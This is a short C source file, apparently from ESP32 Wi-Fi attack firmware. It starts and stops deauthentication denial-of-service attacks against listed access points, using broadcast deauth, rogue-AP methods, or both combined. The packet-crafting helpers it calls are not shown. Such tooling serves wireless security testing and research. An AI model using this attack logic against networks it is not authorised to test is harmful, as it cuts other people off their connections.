/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "attack.h"
#include "attack_method.h"
#include "esp_err.h"
#include "esp_log.h"

namespace {
const char *TAG = "main:attack_dos";
attack_dos_methods_t gMethod = attack_dos_methods_t::ATTACK_DOS_METHOD_COMBINE_ALL;
}  // namespace

void attack_dos_start(attack_config_t attack_config) {
  ESP_LOGI(TAG, "Starting DoS attack...");
  gMethod = (attack_dos_methods_t)attack_config.method;
  switch (gMethod) {
    case ATTACK_DOS_METHOD_BROADCAST:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_BROADCAST");
      attack_method_broadcast(attack_config.ap_records, 1);
      break;
    case ATTACK_DOS_METHOD_ROGUE_AP:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
      attack_method_rogueap(attack_config.ap_records, attack_config.per_ap_timeout);
      break;
    case ATTACK_DOS_METHOD_COMBINE_ALL:
      ESP_LOGD(TAG, "ATTACK_DOS_METHOD_COMBINE_ALL");
      attack_method_rogueap(attack_config.ap_records, attack_config.per_ap_timeout);
      attack_method_broadcast(attack_config.ap_records, 1);
      break;
    default:
      ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
  }
}

void attack_dos_stop() {
  switch (gMethod) {
    case ATTACK_DOS_METHOD_BROADCAST:
      attack_method_broadcast_stop();
      break;
    case ATTACK_DOS_METHOD_ROGUE_AP:
      attack_method_rogueap_stop();
      break;
    case ATTACK_DOS_METHOD_COMBINE_ALL:
      attack_method_broadcast_stop();
      attack_method_rogueap_stop();
      break;
    default:
      ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
  }

  gMethod = attack_dos_methods_t::ATTACK_DOS_METHOD_COMBINE_ALL;

  ESP_LOGI(TAG, "DoS attack stopped");
}
